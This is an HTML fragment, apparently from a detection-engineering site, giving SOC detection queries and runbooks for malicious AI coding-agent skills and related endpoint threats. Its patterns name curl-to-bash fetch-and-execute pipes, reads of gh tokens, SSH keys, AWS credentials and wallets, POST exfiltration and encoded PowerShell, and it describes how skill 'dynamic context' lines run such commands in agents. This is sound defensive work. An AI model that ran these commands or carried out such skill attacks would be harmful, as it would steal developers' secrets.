-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span> <span class="ind tech" title="Command and Scripting Interpreter: PowerShell">T1059.001</span> <span class="ind tech" title="Ingress Tool Transfer">T1105</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>A legitimate skill bootstrapping a toolchain via the well-known `curl … | bash` installers (rustup.rs, get.docker.com, nvm, Homebrew)</li><li>Developer manually running an install one-liner inside the agent&#x27;s integrated terminal</li><li>Internal devops skill that pulls a pinned setup script from a corporate artifact host</li><li>Package manager post-install hook that uses curl piped to sh</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (ProcessCommandLine has_any (&quot;sh.rustup.rs&quot;,&quot;get.docker.com&quot;,&quot;raw.githubusercontent.com/nvm-sh&quot;,&quot;get.pnpm.io&quot;,&quot;brew.sh&quot;,&quot;deb.nodesource.com&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: capture the full ProcessCommandLine and resolve the remote URL being fetched; check it against the well-known-installer allowlist and whether the domain is the clawhub.ai/skills.sh marketplace or an attacker host. 2) Contain: if the URL is untrusted, kill the agent process tree, block the domain at egress, and quarantine the SKILL.md under .claude/skills that issued it. 3) Hunt: review what the downloaded script did — pivot to UC3 (gh auth token / env-dump exfil) and to file writes by the agent in the 10 minutes after the fetch.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-607-uc1-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-607-uc1-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-607-uc1-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-607-uc1-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-607-uc1-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-607-uc1-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-607-uc1-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(30d)
-| where InitiatingProcessFileName in~ (&quot;node&quot;,&quot;node.exe&quot;,&quot;claude&quot;,&quot;claude.exe&quot;,&quot;cursor&quot;,&quot;cursor.exe&quot;,&quot;openclaw&quot;,&quot;openclaw.exe&quot;)
-| where ProcessCommandLine has_any (&quot;curl&quot;,&quot;wget&quot;,&quot;Invoke-WebRequest&quot;,&quot;iwr &quot;)
-| where ProcessCommandLine has_any (&quot;|bash&quot;,&quot;| bash&quot;,&quot;|sh&quot;,&quot;| sh&quot;,&quot;| source&quot;,&quot;|source&quot;,&quot;| zsh&quot;,&quot;Invoke-Expression&quot;,&quot;| iex&quot;,&quot;|iex&quot;)
-| where AccountName !endswith &quot;$&quot;
-| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine, InitiatingProcessCommandLine, FolderPath
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-607-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
-| where TimeGenerated &gt; ago(30d)
-| where ParentProcessName has_any (&quot;node&quot;,&quot;claude&quot;,&quot;cursor&quot;,&quot;openclaw&quot;)
-| where ActingProcessCommandLine has_any (&quot;curl&quot;,&quot;wget&quot;,&quot;Invoke-WebRequest&quot;,&quot;iwr &quot;)
-| where ActingProcessCommandLine has_any (&quot;|bash&quot;,&quot;| bash&quot;,&quot;|sh&quot;,&quot;| sh&quot;,&quot;| source&quot;,&quot;|source&quot;,&quot;| zsh&quot;,&quot;Invoke-Expression&quot;,&quot;| iex&quot;,&quot;|iex&quot;)
-| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ActingProcessName, ActingProcessCommandLine
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-607-uc1-sigma"><pre><button class="copy-btn">COPY</button><code>title: AI Coding Agent Pipes Remote Download Into Interpreter
-id: 8b2e4d17-3c6a-4e9b-bf02-1d77a9c5e330
-description: Detects a Claude Code / Cursor / OpenClaw agent process spawning a shell that pipes curl/wget output directly into bash, sh, source, zsh or PowerShell iex - the dynamic runtime fetch-execute pattern Snyk found in malicious ClawHub skills.
-references:
-  - https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
-  - https://securitylabs.datadoghq.com/articles/malicious-skills-supply-chain-risks-in-coding-agents-with-dynamic-context/
-author: SOC Detection Engineering
-date: 2026/06/26
-tags:
-  - attack.t1059.004
-  - attack.t1105
-  - attack.execution
-logsource:
-  category: process_creation
-detection:
-  selection_parent:
-    ParentImage|endswith:
-      - &#x27;\node.exe&#x27;
-      - &#x27;/node&#x27;
-      - &#x27;\claude.exe&#x27;
-      - &#x27;/claude&#x27;
-      - &#x27;\cursor.exe&#x27;
-      - &#x27;/cursor&#x27;
-      - &#x27;\openclaw.exe&#x27;
-      - &#x27;/openclaw&#x27;
-  selection_download:
-    CommandLine|contains:
-      - &#x27;curl&#x27;
-      - &#x27;wget&#x27;
-      - &#x27;Invoke-WebRequest&#x27;
-  selection_pipe:
-    CommandLine|contains:
-      - &#x27;| bash&#x27;
-      - &#x27;|bash&#x27;
-      - &#x27;| sh&#x27;
-      - &#x27;| source&#x27;
-      - &#x27;| zsh&#x27;
-      - &#x27;Invoke-Expression&#x27;
-      - &#x27;| iex&#x27;
-  condition: selection_parent and selection_download and selection_pipe
-level: high</code></pre></div>
-    <div class="tab-content" id="art-607-uc1-datadog"><pre><button class="copy-btn">COPY</button><code>source:windows.sysmon @EventID:1 (@ParentImage:(*\\node.exe OR *\\claude.exe OR *\\cursor.exe OR *\\openclaw.exe)) (@CommandLine:(*curl* OR *wget* OR *Invoke-WebRequest*)) (@CommandLine:(*bash* OR *source* OR *Invoke-Expression* OR *iex* OR *zsh*))</code></pre></div>
-    <div class="tab-content" id="art-607-uc1-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ParentBaseFileName=/(node|claude|cursor|openclaw)(\.exe)?$/i
-| CommandLine=/(curl|wget|Invoke-WebRequest|iwr).*(\|\s*(bash|sh|zsh|source)|Invoke-Expression|\|\s*iex)/i
-| groupBy([aid, ComputerName, ParentBaseFileName, CommandLine], function=count())
-| sort(count, order=desc)</code></pre></div>
-    <div class="tab-content" id="art-607-uc1-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-607-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-607-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-607-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN (&quot;node&quot;,&quot;node.exe&quot;,&quot;claude&quot;,&quot;claude.exe&quot;,&quot;cursor&quot;,&quot;cursor.exe&quot;,&quot;openclaw&quot;,&quot;openclaw.exe&quot;)) AND (Processes.process=&quot;*curl*&quot; OR Processes.process=&quot;*wget*&quot; OR Processes.process=&quot;*Invoke-WebRequest*&quot; OR Processes.process=&quot;*iwr *&quot;) AND (Processes.process=&quot;*| bash*&quot; OR Processes.process=&quot;*|bash*&quot; OR Processes.process=&quot;*| sh*&quot; OR Processes.process=&quot;*|sh*&quot; OR Processes.process=&quot;*| source*&quot; OR Processes.process=&quot;*|source*&quot; OR Processes.process=&quot;*| zsh*&quot; OR Processes.process=&quot;*Invoke-Expression*&quot; OR Processes.process=&quot;*| iex*&quot;) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-607-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN (&quot;node&quot;,&quot;node.exe&quot;,&quot;claude&quot;,&quot;claude.exe&quot;,&quot;cursor&quot;,&quot;cursor.exe&quot;,&quot;openclaw&quot;,&quot;openclaw.exe&quot;)) AND (Processes.process=&quot;*curl*&quot; OR Processes.process=&quot;*wget*&quot; OR Processes.process=&quot;*Invoke-WebRequest*&quot; OR Processes.process=&quot;*iwr *&quot;) AND (Processes.process=&quot;*| bash*&quot; OR Processes.process=&quot;*|bash*&quot; OR Processes.process=&quot;*| sh*&quot; OR Processes.process=&quot;*|sh*&quot; OR Processes.process=&quot;*| source*&quot; OR Processes.process=&quot;*|source*&quot; OR Processes.process=&quot;*| zsh*&quot; OR Processes.process=&quot;*Invoke-Expression*&quot; OR Processes.process=&quot;*| iex*&quot;) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="68572825f8" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">AI agent skill exfiltrates GitHub token / env secrets via dynamic-context shell-out</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Actions on Objectives</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="68572825f8" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Detects the credential-theft primitive Snyk and Datadog documented in malicious Claude Code skills: SKILL.md &#x27;dynamic context&#x27; lines (the `!`command`` backtick syntax that runs before the model sees content) executing `gh auth token`, env/secret dumps or SSH/AWS key reads under an AI-agent parent, typically chained to a `curl -X POST --data-binary` exfil. Targets the article&#x27;s headline claim that skills may be &#x27;exfiltrating your credentials right now&#x27;.
-
-Rationale: Anchors on the exact credential-theft strings cited in the campaign reporting - `gh auth token`, env dumps (printenv/os.environ), SSH keys, ~/.aws/credentials, wallet.dat, browser Login Data - parented by the article&#x27;s AI agents, with an ExfilContext flag for the chained `curl --data-binary` POST Datadog observed.
-
-Cross-checked against:
-  • https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
-  • https://securitylabs.datadoghq.com/articles/malicious-skills-supply-chain-risks-in-coding-agents-with-dynamic-context/
-  • https://www.trendmicro.com/en_us/research/26/b/openclaw-skills-used-to-distribute-atomic-macos-stealer.html</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Unsecured Credentials: Credentials In Files">T1552.001</span> <span class="ind tech" title="Credentials from Password Stores: Credentials from Web Browsers">T1555.003</span> <span class="ind tech" title="Exfiltration Over Web Service: Exfiltration to Cloud Storage">T1567.002</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Developer or CI legitimately running `gh auth token` to script a GitHub API call</li><li>A coding agent reading project .env / process.env as part of a normal build or test task</li><li>DevOps skill that references ~/.aws/credentials for an authorized deployment</li><li>Dotenv/secrets-loader libraries echoing variable names (not values) during debug</li><li>Password-manager or browser-sync tooling touching &#x27;Login Data&#x27;</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (ProcessCommandLine has_any (&quot;gh auth status&quot;,&quot;gh auth login&quot;,&quot;gh auth setup-git&quot;) and ExfilContext == &quot;read-only&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: inspect the full command line and the ExfilContext flag — &#x27;inline-exfil&#x27; (cred read chained to curl/POST/nc) is near-certain malicious; identify the SKILL.md in .claude/skills that drove it and check for `!`backtick`` dynamic-context lines. 2) Contain: revoke the exposed credential immediately (rotate the gh token, AWS access keys, SSH keys), isolate the host, and quarantine the offending skill. 3) Hunt: search egress for POSTs carrying the stolen data to non-corporate hosts, correlate with UC1 (marketplace download) to find the source skill, and sweep other dev endpoints for the same SKILL.md hash/skill ID.</div></details>
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-607-uc2-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-607-uc2-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-607-uc2-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-607-uc2-datadog">Datadog</button>
-      <button class="tab-btn" data-target="art-607-uc2-falcon">Falcon LogScale</button>
-      <button class="tab-btn" data-target="art-607-uc2-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-607-uc2-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(30d)
-| where InitiatingProcessFileName in~ (&quot;node&quot;,&quot;node.exe&quot;,&quot;claude&quot;,&quot;claude.exe&quot;,&quot;cursor&quot;,&quot;cursor.exe&quot;,&quot;openclaw&quot;,&quot;openclaw.exe&quot;,&quot;bash&quot;,&quot;sh&quot;,&quot;zsh&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;)
-| where ProcessCommandLine has_any (&quot;gh auth token&quot;,&quot;printenv&quot;,&quot;process.env&quot;,&quot;os.environ&quot;,&quot;cat .env&quot;,&quot;type .env&quot;,&quot;id_rsa&quot;,&quot;id_ed25519&quot;,&quot;.aws/credentials&quot;,&quot;.aws\\credentials&quot;,&quot;wallet.dat&quot;,&quot;Login Data&quot;)
-| where AccountName !endswith &quot;$&quot;
-| extend ExfilContext = iff(ProcessCommandLine has_any (&quot;curl&quot;,&quot;wget&quot;,&quot;Invoke-RestMethod&quot;,&quot;--data-binary&quot;,&quot;-X POST&quot;,&quot;nc &quot;), &quot;inline-exfil&quot;, &quot;read-only&quot;)
-| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine, ExfilContext, InitiatingProcessCommandLine
-| order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-607-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
-| where TimeGenerated &gt; ago(30d)
-| where ParentProcessName has_any (&quot;node&quot;,&quot;claude&quot;,&quot;cursor&quot;,&quot;openclaw&quot;,&quot;bash&quot;,&quot;sh&quot;,&quot;zsh&quot;,&quot;cmd&quot;,&quot;powershell&quot;,&quot;pwsh&quot;)
-| where ActingProcessCommandLine has_any (&quot;gh auth token&quot;,&quot;printenv&quot;,&quot;process.env&quot;,&quot;os.environ&quot;,&quot;cat .env&quot;,&quot;type .env&quot;,&quot;id_rsa&quot;,&quot;id_ed25519&quot;,&quot;.aws/credentials&quot;,&quot;.aws\\credentials&quot;,&quot;wallet.dat&quot;,&quot;Login Data&quot;)
-| extend ExfilContext = iff(ActingProcessCommandLine has_any (&quot;curl&quot;,&quot;wget&quot;,&quot;Invoke-RestMethod&quot;,&quot;--data-binary&quot;,&quot;-X POST&quot;,&quot;nc &quot;), &quot;inline-exfil&quot;, &quot;read-only&quot;)
-| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ActingProcessName, ActingProcessCommandLine, ExfilContext
-| order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-607-uc2-sigma"><pre><button class="copy-btn">COPY</button><code>title: AI Agent Skill Extracts gh Token / Env Secrets via Shell-Out
-id: c4a7e9b2-5d18-4f33-9a60-2b8f1e7c0d55
-description: Detects an AI coding agent (Claude Code / Cursor / OpenClaw) or its child shell running gh auth token, environment dumps, or SSH/AWS/wallet credential reads - the dynamic-context credential-theft behaviour Snyk and Datadog documented in malicious ClawHub skills.
-references:
-  - https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
-  - https://securitylabs.datadoghq.com/articles/malicious-skills-supply-chain-risks-in-coding-agents-with-dynamic-context/
-author: SOC Detection Engineering
-date: 2026/06/26
-tags:
-  - attack.t1552.001
-  - attack.t1555.003
-  - attack.credential_access
-logsource:
-  category: process_creation
-detection:
-  selection_parent:
-    ParentImage|endswith:
-      - &#x27;\node.exe&#x27;
-      - &#x27;/node&#x27;
-      - &#x27;\claude.exe&#x27;
-      - &#x27;/claude&#x27;
-      - &#x27;\cursor.exe&#x27;
-      - &#x27;/cursor&#x27;
-      - &#x27;\openclaw.exe&#x27;
-      - &#x27;/openclaw&#x27;
-  selection_cred:
-    CommandLine|contains:
-      - &#x27;gh auth token&#x27;
-      - &#x27;printenv&#x27;
-      - &#x27;os.environ&#x27;
-      - &#x27;cat .env&#x27;
-      - &#x27;id_rsa&#x27;
-      - &#x27;id_ed25519&#x27;
-      - &#x27;.aws/credentials&#x27;
-      - &#x27;.aws\credentials&#x27;
-      - &#x27;wallet.dat&#x27;
-      - &#x27;Login Data&#x27;
-  condition: selection_parent and selection_cred
-level: high</code></pre></div>
-    <div class="tab-content" id="art-607-uc2-datadog"><pre><button class="copy-btn">COPY</button><code>source:windows.sysmon @EventID:1 (@ParentImage:(*\\node.exe OR *\\claude.exe OR *\\cursor.exe OR *\\openclaw.exe) OR @Image:(*\\node.exe OR *\\claude.exe OR *\\cursor.exe OR *\\openclaw.exe)) @CommandLine:(*&quot;gh auth token&quot;* OR *printenv* OR *os.environ* OR *id_rsa* OR *id_ed25519* OR *credentials* OR *wallet.dat* OR *&quot;Login Data&quot;*)</code></pre></div>
-    <div class="tab-content" id="art-607-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ParentBaseFileName=/(node|claude|cursor|openclaw|bash|sh|zsh|cmd\.exe|powershell\.exe|pwsh)/i
-| CommandLine=/(gh\s+auth\s+token|printenv|os\.environ|process\.env|cat\s+\.env|id_rsa|id_ed25519|\.aws[\/\\]credentials|wallet\.dat|Login Data)/i
-| ExfilContext := if(regex(&quot;(curl|wget|Invoke-RestMethod|--data-binary|-X POST|nc )&quot;, field=CommandLine), then=&quot;inline-exfil&quot;, else=&quot;read-only&quot;)
-| groupBy([aid, ComputerName, ParentBaseFileName, ExfilContext, CommandLine], function=count())
-| sort(count, order=desc)</code></pre></div>
-    <div class="tab-content" id="art-607-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-607-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-607-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-607-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN (&quot;node&quot;,&quot;node.exe&quot;,&quot;claude&quot;,&quot;claude.exe&quot;,&quot;cursor&quot;,&quot;cursor.exe&quot;,&quot;openclaw&quot;,&quot;openclaw.exe&quot;,&quot;bash&quot;,&quot;sh&quot;,&quot;zsh&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;)) AND (Processes.process=&quot;*gh auth token*&quot; OR Processes.process=&quot;*printenv*&quot; OR Processes.process=&quot;*process.env*&quot; OR Processes.process=&quot;*os.environ*&quot; OR Processes.process=&quot;*cat .env*&quot; OR Processes.process=&quot;*type .env*&quot; OR Processes.process=&quot;*id_rsa*&quot; OR Processes.process=&quot;*id_ed25519*&quot; OR Processes.process=&quot;*.aws/credentials*&quot; OR Processes.process=&quot;*.aws\\credentials*&quot; OR Processes.process=&quot;*wallet.dat*&quot;) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime</code></pre><pre class="spl-mode-body" id="art-607-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.parent_process_name IN (&quot;node&quot;,&quot;node.exe&quot;,&quot;claude&quot;,&quot;claude.exe&quot;,&quot;cursor&quot;,&quot;cursor.exe&quot;,&quot;openclaw&quot;,&quot;openclaw.exe&quot;,&quot;bash&quot;,&quot;sh&quot;,&quot;zsh&quot;,&quot;cmd.exe&quot;,&quot;powershell.exe&quot;,&quot;pwsh&quot;)) AND (Processes.process=&quot;*gh auth token*&quot; OR Processes.process=&quot;*printenv*&quot; OR Processes.process=&quot;*process.env*&quot; OR Processes.process=&quot;*os.environ*&quot; OR Processes.process=&quot;*cat .env*&quot; OR Processes.process=&quot;*type .env*&quot; OR Processes.process=&quot;*id_rsa*&quot; OR Processes.process=&quot;*id_ed25519*&quot; OR Processes.process=&quot;*.aws/credentials*&quot; OR Processes.process=&quot;*.aws\\credentials*&quot; OR Processes.process=&quot;*wallet.dat*&quot;) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime) | sort - lastTime</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="27f9f5bb66" data-platforms="def,sent,sigma,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">PowerShell encoded / obfuscated command</span>
-    <span class="uc-phase">Exploitation</span>
-    <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="27f9f5bb66" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Encoded or obfuscated PowerShell — common across loaders, recon, and post-exploitation.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="PowerShell">T1059.001</span> <span class="ind tech" title="Obfuscated Files or Information">T1027</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">DeviceProcessEvents</span></div>
-    
-    <div class="tabs">
-      <button class="tab-btn active" data-target="art-607-uc3-kql">Defender KQL</button>
-      <button class="tab-btn" data-target="art-607-uc3-sentinel">Sentinel KQL</button>
-      <button class="tab-btn" data-target="art-607-uc3-sigma">Sigma</button>
-      <button class="tab-btn" data-target="art-607-uc3-spl">Splunk SPL (CIM)</button>
-    </div>
-    <div class="tab-content active" id="art-607-uc3-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
-| where Timestamp &gt; ago(7d)
-| where AccountName !endswith &quot;$&quot;
-| where FileName in~ (&quot;powershell.exe&quot;,&quot;pwsh.exe&quot;)
-| where ProcessCommandLine matches regex @&quot;(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)&quot;
-| project Timestamp, DeviceName, AccountName, ProcessCommandLine,
-          InitiatingProcessFileName, InitiatingProcessCommandLine</code></pre></div>
-    <div class="tab-content" id="art-607-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>SecurityEvent
-| where TimeGenerated &gt; ago(7d)
-| where EventID == 4688
-| where Account !endswith &quot;$&quot;
-| where NewProcessName endswith &quot;\powershell.exe&quot;
-   or NewProcessName endswith &quot;\pwsh.exe&quot;
-| where CommandLine matches regex @&quot;(?i)(-enc|encodedcommand|frombase64string|-nop|-w\s+hidden|invoke-expression|iex\s*\(|downloadstring|net\.webclient)&quot;
-| project TimeGenerated, Computer, Account, NewProcessName,
-          CommandLine, ParentProcessName
-| order by TimeGenerated desc
-</code></pre></div>
-    <div class="tab-content" id="art-607-uc3-sigma"><pre><button class="copy-btn">COPY</button><code>title: Obfuscated / Encoded PowerShell Execution
-id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
-status: experimental
-description: |
-    PowerShell launched with -EncodedCommand, base64 strings, hidden
-    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
-    .WebClient.DownloadString — combinations indicating evasion.
-references:
-    - https://attack.mitre.org/techniques/T1059/001/
-    - https://attack.mitre.org/techniques/T1027/
-author: Clankerusecase
-date: 2026/05/02
-tags:
-    - attack.t1059.001
-    - attack.t1027
-    - attack.execution
-    - attack.defense-evasion
-logsource:
-    category: process_creation
-    product: windows
-detection:
-    selection_image:
-        Image|endswith:
-            - &#x27;\powershell.exe&#x27;
-            - &#x27;\pwsh.exe&#x27;
-    selection_args:
-        CommandLine|contains:
-            - &#x27;-enc &#x27;
-            - &#x27;EncodedCommand&#x27;
-            - &#x27;FromBase64String&#x27;
-            - &#x27;Invoke-Expression&#x27;
-            - &#x27;IEX(&#x27;
-            - &#x27;DownloadString&#x27;
-            - &#x27;Net.WebClient&#x27;
-            - &#x27;-w hidden&#x27;
-            - &#x27;-WindowStyle Hidden&#x27;
-            - &#x27;-nop&#x27;
-            - &#x27;-NoProfile&#x27;
-            - &#x27;-ep bypass&#x27;
-            - &#x27;-ExecutionPolicy Bypass&#x27;
-    condition: selection_image and selection_args
-falsepositives:
-    - DevOps tooling that legitimately uses encoded command for
-      cross-shell escaping
-level: high
-</code></pre></div>
-    <div class="tab-content" id="art-607-uc3-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-607-uc3-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-607-uc3-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-607-uc3-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Endpoint.Processes
-    where Processes.process_name IN (&quot;powershell.exe&quot;,&quot;pwsh.exe&quot;)
-      AND (Processes.process=&quot;*-enc *&quot; OR Processes.process=&quot;*EncodedCommand*&quot;
-        OR Processes.process=&quot;*FromBase64String*&quot; OR Processes.process=&quot;*-nop*&quot;
-        OR Processes.process=&quot;*-w hidden*&quot; OR Processes.process=&quot;*Invoke-Expression*&quot;
-        OR Processes.process=&quot;*IEX(*&quot; OR Processes.process=&quot;*DownloadString*&quot;
-        OR Processes.process=&quot;*Net.WebClient*&quot;)
-    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
-| `drop_dm_object_name(Processes)`</code></pre><pre class="spl-mode-body" id="art-607-uc3-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
-    from datamodel=Endpoint.Processes
-    where Processes.process_name IN (&quot;powershell.exe&quot;,&quot;pwsh.exe&quot;)
-      AND (Processes.process=&quot;*-enc *&quot; OR Processes.process=&quot;*EncodedCommand*&quot;
-        OR Processes.process=&quot;*FromBase64String*&quot; OR Processes.process=&quot;*-nop*&quot;
-        OR Processes.process=&quot;*-w hidden*&quot; OR Processes.process=&quot;*Invoke-Expression*&quot;
-        OR Processes.process=&quot;*IEX(*&quot; OR Processes.process=&quot;*DownloadString*&quot;
-        OR Processes.process=&quot;*Net.WebClient*&quot;)
-    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
-| `drop_dm_object_name(Processes)`</code></pre></div></div>
-  </div>
-</details>
-<details class="uc" data-uc-slug="178f88b42d" data-platforms="def,sent,sigma,spl" data-targets="windows">
-  <summary>
-    <span class="uc-title">Trusted vendor binary / installer launching unusual children</span>
-    <span class="uc-phase">Exploitation</span>
-    <span class="uc-conf medium">Medium</span>
-    <button class="share-btn" data-share-uc="178f88b42d" title="Copy share link to this UC" aria-label="Copy share link">
-      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
-    </button>
-  </summary>
-  <div class="uc-body">
-    <div class="uc-desc">Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Compromise Software Supply Chain">T1195.002</span></div>
-    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span> <span class="ind">DeviceProcessEvents</span></div>
-    
-    <div class="tabs">
